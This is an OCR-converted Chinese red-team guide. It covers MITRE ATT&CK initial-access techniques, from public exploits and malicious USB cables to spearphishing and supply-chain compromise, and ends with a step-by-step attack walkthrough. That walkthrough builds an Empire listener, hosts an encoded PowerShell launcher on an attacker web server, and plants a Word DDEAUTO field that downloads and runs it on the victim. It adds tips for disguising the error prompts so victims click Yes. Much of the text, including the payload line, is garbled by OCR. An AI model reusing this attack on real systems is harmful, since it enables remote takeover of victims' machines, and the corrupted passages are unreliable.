> Intel(R) PR0/1000 MT Network Connection 00:0c:29:4a:a5:c6
>
> 1500
>
> 192.168.46.129
>
> 255 . 25 5 . 25 5 . 0
>
> fe80: :708e:65lc:d242:ab41 ffff: ffff: ffff: ffff::
>
> Interface 12
>
> ============
##### Name Hardware MAC
> MTU
##### Microsoft ISATAP Adapter 00:00:00:00:00:00
> 1280
>
> Interface 13
>
> ============
##### Name Hardware MAC MTU
> IPv6 Address IPV6 Netmask IPv6 Address IPv6 Netmask
>
> \- 心 ·H"" \'\|
##### Teredo Tu nne l i ng Ps e ud o - I nt e r f a ce 00: 00:00: 00:00: 00
> 1280
>
> 2001:0:da44:fa75:180c:2a4:3f57:dl7e
>
> ffff: ffff: ffff: ffff:: fe80: :180c:2a4:3f57:dl7e ffff: ffff: ffff:
> ffff: :
>
> ![](media/image13.jpeg){width="5.83878280839895in"
> height="4.240624453193351in"}
####### 5、Beef 攻击框架
> **二、[利用公开漏洞](https://attack.mitre.org/techniques/T1190/)**
>
> 利用软件、数据库、中间件、第三方库或存在漏洞的库等公开的漏洞，对目标系统进行攻击，以达到攻击未及时修补或升级的信息系统。
>
> 公开漏洞来源：
1.  CVE、CNVD、CNNVD、exploit-db 等漏洞库
2.  qq 群、推特、社区、论坛等社交平台
3.  github
## 三、[外部远程服务](https://attack.mitre.org/techniques/T1133/)
> VPN，Citrix
> 等远程服务和其他访问机制允许用户从外部位置连接到内部企业网络资源。通常有远程服务网关来管理这些服务的连接和凭证身份验
>
> 证。Windows
> 远程管理等服务也可以在外部使用。通常需要访问有效帐户来使用该服务，这可以通过凭证嫁接或在危及企业网络后从用户处获得凭证来实现。在操作期间，可以将对远程服务的访问用作冗余访问的一部分。
>
> 远程服务：VPN、Citrix、SSH、Windows 远程桌面、TeamViewer、EasyConnect
> 等
## 四、[渗透到其他网络介质](https://attack.mitre.org/techniques/T1011/)
> 如果命令和控制网络是有线因特网连接，则可以例如通过WiFi
> 连接，调制解调器，蜂窝数据连接，蓝牙或其他射频（RF）信道进行泄漏。如果攻击者具有足够的访问权限或接近度，则攻击者可以选择执行此操作，并且可能无法保护或保护连接以及主要的Internet
> 连接通道，因为它不通过同一企业网络路由。
## 五、[硬件攻击](https://attack.mitre.org/techniques/T1200/)
> 计算机附件，计算机或网络硬件可以作为矢量引入系统以获得执行。虽然APT
> 组使用的公开参考很少，但许多渗透测试人员利用硬件添加进行初始访问。商业和开源产品的功能包括被动网络窃听，打破中间人加密，击键注入，通过DMA
> 读取内核内存，增加新的无线接入现有网络等。
>
> 可添加的硬件：U 盘、鼠标、键盘、硬盘、智能设备、摄像头、打印机、USB
> 数据线、Pineapple 等
####### 1[、通过一根数据线控制你的苹果电脑](http://mg.lol/blog/defcon-2019/)
> 一根经过特殊定制的苹果手机充电器，使用它连接苹果电脑后，可以通过植入
>
> 木 马 ， 远 程 操 控 电 脑 。 参 考 链 接 ：
> https://mp.weixin.qq.com/s/bnbODlzMn7_vCgWyfm4Rsg DemonSeed 恶意USB
> 数据线：https://github.com/O-MG/DemonSeed
## 六、[通过可移动媒体进行复制](https://attack.mitre.org/techniques/T1091/)
> 通过将恶意软件复制到可移动媒体并在将媒体插入系统并执行时利用自动运行功能，攻击者可能会移动到系统上，可能是那些在断开连接或气隙网
>
> 络上的系统。在横向移动的情况下，这可能通过修改存储在可移动媒体上的可执行文件或通过复制恶意软件并将其重命名为合法文件来欺骗用户在单独的系统上执行它来实现。在初始访问的情况下，这可以通过手动操纵媒体，修改用于初始格式化媒体的系统或修改媒体固件本身来实现。
>
> 可移动媒体：BadUSB、光碟等
## 七、[鱼叉式钓鱼附件](https://attack.mitre.org/techniques/T1193/)
> 鱼叉式钓鱼附件是鱼叉式钓鱼的一种特殊变体。鱼叉式钓鱼附件不同于其他形式的鱼叉式钓鱼，因为它发送带有有恶意软件的附件。所有形式的鱼叉式网络钓鱼都是以电子邮件的方式提供针对特定个人，公司或行业的社会工程。在这种情况下，攻击者会将文件附加到鱼叉式网络钓鱼电子邮件中，并且通常依靠用户执行来获取执行权。
>
> 附件有许多选项，例如Microsoft Office 文档，可执行文件，PDF
> 或存档文件。打开附件后，攻击者的有效负载会利用漏洞或直接在用户的系统上执行。鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由，
> 说明为什么要打开文件，并且可以解释如何绕过系统保护以便这样做。该电子邮件还可能包含有关如何解密附件的说明，例如zip
> 文件密码，以逃避电子邮件边界防御。攻击者经常操纵文件扩展名和图标，以使附加的可执行文件看起来像是文档文件，或者利用一个应用程序的文件看起来是另一个应用程序的文件。
## 八、[鱼叉式钓鱼链接](https://attack.mitre.org/techniques/T1192/)
> 带链接的鱼叉式网页钓鱼是鱼叉式网页钓鱼的一种特殊变种。它与其他形式的鱼叉式网络钓鱼不同之处在于它使用链接来下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件本身，以避免可能检查电子邮件附件的防御。
>
> 所有形式的鱼叉式网络钓鱼都是以电子方式提供的针对特定个人，公司或行业的社会工程。在这种情况下，恶意电子邮件包含链接。通常，链接将伴随社会工程文本，并要求用户主动点击或复制并将URL
> 粘贴到浏览器
>
> 中，从而利用用户执行。被访问的网站可能使用漏洞攻击来破坏Web
> 浏览器，或者用户会被提示下载应用程序、文档、zip
> 文件，甚至是可执行文件，这首先取决于电子邮件的借口。攻击者还可以包括旨在与电子邮件阅读器直接交互的链接，包括旨在直接利用终端系统的嵌入式图像或验证电子邮件的接收（即网络错误/网络信标）。
## 九、[通过服务进行鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1194/)
> 通过服务进行的鱼叉式网络钓鱼是鱼叉式钓鱼的一种特殊变种。它与其他形式的鱼叉式网络钓鱼不同之处在于它使用第三方服务而不是直接通过企业电子邮件渠道。
>
> 所有形式的鱼叉式网络钓鱼都是以电子方式提供的针对特定个人，公司或行业的社会工程。在这种情况下，攻击者通过各种社交媒体服务，个人网络邮件和其他非企业控制的服务发送消息。与企业相比，这些服务更可能具有不太严格的安全策略。与大多数类型的鱼叉式网络钓鱼一样，所发送的服务是与目标产生融洽关系，或以某种方式获得目标的兴趣。攻击者会创建虚假的社交媒体帐户，并向员工发送潜在工作机会的信息。这样做可以提供一个合理的理由来询问在环境中运行的服务、策略和软件。然后，
> 攻击者可以通过这些服务发送恶意链接或附件。
> 一个常见的例子是通过社交媒体与目标建立融洽关系，然后将内容发送到目标在其工作计算机上使用的个人网络邮件服务。这允许攻击者绕过对工作帐户的某些电子邮件限制，并且目标更有可能打开文件，因为内容是他们期望的东西。如果有效负载不能按预期工作，则攻击者可以继续正常通信，并与目标进行故障排除，了解如何使其正常工作。
## 十、[供应链妥协](https://attack.mitre.org/techniques/T1195/)
> 供应链妥协是指最终消费者在收到数据或系统损害之前对产品或产品交付机制的操纵。
>
> 供应链的妥协可以在供应链的任何阶段进行，包括：
-   操纵开发工具
-   操纵开发环境
-   操作源代码存储库（公共或私有）
-   在开源依赖中操作源代码
-   操纵软件更新/分发机制
-   受损/受感染的系统映像（工厂感染的多个可移动介质案例）
-   用修改版本替换合法软件
-   向合法分销商销售改装/假冒产品
-   装运拦截
> 虽然供应链妥协可能会影响硬件或软件的任何组件，但寻求获得执行的攻击者通常会专注于在软件分发或更新渠道中对合法软件的恶意添加。定位可能特定于所需的受害者集，或者恶意软件可能会分发给广泛的消费者，
> 但只会针对特定受害者采取其他策略。在许多应用程序中用作依赖项的流行开源项目也可能成为向依赖项用户添加恶意代码的手段。
## 十一、[利用可靠关系](https://attack.mitre.org/techniques/T1199/)
> 攻击者可能会破坏或以其他方式利用能够接触到目标受害者的组织。通过可信的第三方关系访问利用现有的连接，与访问网络的标准机制相比，该连接可能不受保护，或者受到的审查较少。
>
> 组织经常授予第二或第三方外部提供者更高的访问权限，以便允许他们管理内部系统。这些关系的一些例子包括IT
> 服务承包商、托管安全供应
>
> 商、基础设施承包商(例如HVAC、电梯、物理安全)。第三方提供者的访问可能仅限于正在维护的基础设施，但可能与企业的其他部分存在于同一网络上。因此，另一方用于访问内部网络系统的有效帐户可能被破坏和使用。
## 十二、[利用合法帐号](https://attack.mitre.org/techniques/T1078/)
> 攻击者可以使用凭据访问技术窃取特定用户或服务帐户的凭据，或者通过社会工程在其侦察过程中更早地捕获凭据，以获得初始访问权。
>
> 攻击者可能使用的帐户可以分为三类:默认帐户、本地帐户和域帐户。默认帐户是那些内置到操作系统中的帐户，比如Windows
> 系统上的访客或管理员帐户，或者其他类型的系统、软件或设备上的默认工厂/供应商帐户。本地帐户是由组织为用户、远程支持、服务或单个系统或服务上的管理而配置的帐户。域帐户是由Active
> Directory
> 域服务管理的，其中访问和权限是跨属于该域的系统和服务配置的。域帐户可以覆盖用户、管理员和服务。
>
> 受危害的凭据可以用来绕过对网络内系统上各种资源的访问控制，甚至可以用于对远程系统和外部可用服务(如VPNs、Outlook
> Web access
> 和远程桌面)的持久访问。受损害的凭据还可能授予攻击者对特定系统或访问网络的受限区域的更多特权。攻击者可能会选择不使用恶意软件或工具，
> 使用这些证书提供的合法访问权限，从而使检测它们的存在变得更加困 难。
>
> 缺省帐户也不限于客户机上的客户机和管理员，它们还包括为网络设备和计算机应用程序等设备预先设置的帐户，无论这些设备是内部的、开放源码的还是COTS
> 的。预置用户名和密码组合的设备对安装后不更改it
> 的组织构成严重威胁，因为它们很容易成为攻击者的目标。类似地，攻击者也可以利用公开公开的私钥，或偷来的私钥，通过远程服务合法地连接到远程环境
>
> 帐户访问、凭据和跨系统网络的权限的重叠是值得关注的，因为攻击者可能能够跨帐户和系统进行切换，以达到较高的访问级别(即，以绕过在企业内设置的访问控制。
## 十三、近距离通讯攻击
> 通过利用近距离通讯来进行攻击。利用目标存在的近距离通讯，例如WIFI，WiFi
> 安全标标准中常用的加密算法如WEP、WPA/WPA2、
>
> WPA-PSK/WPA2-PSK 等都存在问题，易被窃听，且容易泄露用户系统信息和PSK
> 等重要安全信息，认证机制相对简单，易被各种方式主动攻击，得益与这些弱点，WIFI
> 攻击变得容易。对近距离通讯进行中继攻
>
> 击。
>
> 攻击方式：WIFI、蓝牙、ZigBee、NFC、RFID 等。
## 十四、\[未知漏洞攻击\]
> 通过fuzz 所有可能fuzz 的目标，寻找未知漏洞，利用未知漏洞进行攻击。
>
> 可攻击点：
1.  web 网站
2.  服务器
3.  协议fuzz
4.  硬件fuzz
# 二、Execution
## 远程动态数据交换
环境： 攻击机A：Kali（10.100.18.20）用于接收反向shell 连接 被攻击机：
Windows 2012 R2 （10.100.18.21） 攻击手法： 1.创建一个Empire Listener
监听线程
![](media/image14.jpeg){width="5.864992344706912in"
height="1.2349989063867017in"}
查看设置信息
![](media/image15.jpeg){width="5.880569772528434in"
height="3.267915573053368in"}
开始监听
![](media/image16.jpeg){width="5.747648731408574in" height="1.3975in"}
2.  当监听线程启动运行之后，运行以下命令，生成将要在目标受害机器上执行的PowerShell
    代码： launcher powershell sangfor 3.复制powershell -noP -sta
-w 1 -enc 之后的转码脚本并另存为一个文件
![](media/image17.jpeg){width="5.881575896762905in"
height="2.4383333333333335in"}
然后把它部署于某个攻击需要用到的Web
服务器中，用于受害主机稍后的请求下载。该Web 服务器可以是Apache
之类的，但在这里，我用Python SimpleHTTPServer 模块来快速启动一个Web
服务，它会自动托管你启动命令目录内的文件，当然最好可以创建一个文件目录，然后通过终端cd
到其中进行文件生成（我这里是evil)和启动Web 服务。（Python 的Web
服务默认监听端口为8000)
![](media/image18.jpeg){width="5.884323053368329in" height="2.64in"}
4.新建一个Word 文档，通过点击文档部件点击域或者Ctrl+F9
添加一个域，然后修改域代码为：
![](media/image19.jpeg){width="5.8848031496063in"
height="1.5720833333333333in"}
选择=(Formula),点击确定
![](media/image20.jpeg){width="5.869776902887139in"
height="3.955416666666667in"}
在生成的内容上面，右键点击切换域代码(T)
![](media/image21.jpeg){width="5.869494750656168in" height="4.125in"}
插入powershell 代码
![](media/image22.jpeg){width="5.74507217847769in"
height="2.9383333333333335in"}
{ DDEAUTO c:\\windows\\system32\\cmd.exe \"/k PowerShell -Nop -sta -NonI
-W Hidden  =(푁  w −
푂 푏 푗  푐 푡 S y s 푡  㷟 .푁  푡
.푊 푏 퐶  i  n 푡
).퐷 표 w n  표 푎 S 푡 ⿏ i n ⢣ (′ℎ푡 푡
##### ://10.10.10.10:8000/
 푣 i  ′); 표 w  ⿏ s ℎ   − e\" } 现在就
可以保存该文档，准备把它发送给目标受害者了。一旦受害者点击打开该文档，会跳出几个错误，可以配合社工技巧来迷惑用户来点击Yes。可以修改这些错误消息
更直观好看一点，例如有一些测试人员就把它修改为'Symantec Document
Encryption'。
一旦受害者把所有错误消息都点击了Yes
之后，在我们的监听端就会反弹回一个Empire
的控制连接，对受害者系统形成远程控制。
![](media/image23.jpeg){width="5.748682195975503in"
height="4.102916666666666in"}
![](media/image24.png)
> 匡暹 顽 心 却
>
> 四布局
>
> 引用 邮件 古阅 炽图
>
> 飞扎 工 ．” A• A. 心
>
> 铅
>
> \', t n 囚 ＿ ．： ．｀ 亏 · 茬 圭
>